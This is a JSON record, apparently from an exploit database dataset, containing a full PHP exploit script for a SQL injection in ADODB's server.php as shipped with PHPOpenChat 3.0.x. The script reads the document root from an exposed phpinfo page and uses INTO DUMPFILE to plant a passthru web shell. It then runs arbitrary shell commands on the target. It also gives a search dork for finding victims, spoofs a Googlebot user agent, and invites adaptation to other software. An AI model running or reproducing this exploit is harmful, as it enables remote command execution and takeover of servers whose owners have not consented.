{
  "id": "1652",
  "title": "ADODB &lt; 4.70 (PHPOpenChat 3.0.x) - &#039;Server.php&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"PhpOpenChat 3.0.x ADODB Server.php \\\"sql\\\" SQL injection\\r\\n\";\r\necho \"by rgod rgod@autistici.org\\r\\n\";\r\necho \"site: http://retrogod.altervista.org\\r\\n\\r\\n\";\r\necho \"dork: Welcome to your PHPOpenChat-Installation!\\r\\n\\r\\n\";\r\n\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" host path cmd OPTIONS\\r\\n\";\r\necho \"host:      target server (ip/hostname)\\r\\n\";\r\necho \"path:      path to PhpOpenChat\\r\\n\";\r\necho \"cmd:       a shell command\\r\\n\";\r\necho \"Options:\\r\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\r\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\r\\n\";\r\necho \"Examples:\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /chat/ \\r\\n\";\r\necho \"php \".$argv[0].\" localhost /chat/ ls -la -p81\\r\\n\";\r\necho \"php \".$argv[0].\" localhost / ls -la -P1.1.1.1:80\\r\\n\";\r\ndie;\r\n}\r\n/*\r\n this is based on\r\n\r\n https://www.securityfocus.com/bid/16187\r\n\r\n but... look at the server.php source code:\r\n\r\n...\r\n$driver = 'mysql';\r\n$host = 'localhost'; // DSN for odbc\r\n$uid = 'root';\r\n$pwd = '';\r\n$database = 'test';\r\n...\r\n\r\nyou need a \"root\" user with no password, an existent \"test\" database\r\nand Mysql to have certain rights to write files...\r\nso, this vulnerability is very hard to exploit\r\nhowever, here is the code for PhpOpenChat, you can easily change it to work\r\nagainst the program you want\r\n\t\t\t\t\t\t\t\t\t      */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$action=$argv[3];\r\n$cmd=\"\";$port=80;$proxy=\"\";\r\n\r\nfor ($i=3; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\"))\r\n{$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\n$cmd=urlencode($cmd);\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n#step 1->read DOCUMENT ROOT from phpinfo\r\n$packet =\"GET \".$p.\"include/adodb/tests/tmssql.php?do=phpinfo HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"DOCUMENT_ROOT </td><td class=\\\"v\\\">\",$html);\r\n$temp2=explode(\" </td></tr>\",$temp[1]);\r\n$fullpath=$temp2[0];\r\n$fullpath=trim($fullpath);\r\necho \"DOCUMENT ROOT ->\".$fullpath.\"\\r\\n\\r\\n\";\r\n$fullpath=str_replace(\"\\\\\",\"\\\\\\\\\\\\\\\\\",$fullpath); // win boxes\r\nif ($fullpath==\"\")\r\n{\r\necho $html;\r\ndie(\"\\r\\n\\r\\nCannot read phpinfo ...\\r\\n\");\r\n}\r\n\r\n#step 2->execute a query (you can regardless of magic_quotes_gpc)\r\n$SQL =\"SELECT '<?php echo chr(0x2a).\\\"delim*\\\";passthru(\\$_GET[\\\"cmd\\\"]);echo chr(0x2a).\\\"delim*\\\";?>',0,0,0,0,0 \";\r\n$SQL.=\"INTO DUMPFILE '\".$fullpath.\"/suntzu.php' FROM poc.poc_user_account LIMIT 1\";\r\n$SQL=urlencode($SQL);\r\n$packet =\"GET \".$p.\"include/adodb/server.php?sql=$SQL HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (strstr($html,\"Access denied\") || !strstr($html,\"200 OK\") || strstr($html,\"Can't connect\"))\r\n{\r\necho $html;\r\ndie(\"\\r\\n\\r\\nExploit failed...\\r\\n\");\r\n}\r\nsleep(1);\r\n#step 3->launch commands\r\n$packet =\"GET /suntzu.php?cmd=\".$cmd.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (!strstr($html,\"*delim*\"))\r\n{\r\necho $html;\r\ndie(\"\\r\\n\\r\\nExploit failed...\\r\\n\");\r\n}\r\nelse\r\n{\r\necho \"Exploit succeeded...\\r\\n\";\r\n$temp=explode(\"*delim*\",$html);\r\necho $temp[1];\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-09]",
  "url": "https://www.exploit-db.com/exploits/1652"
}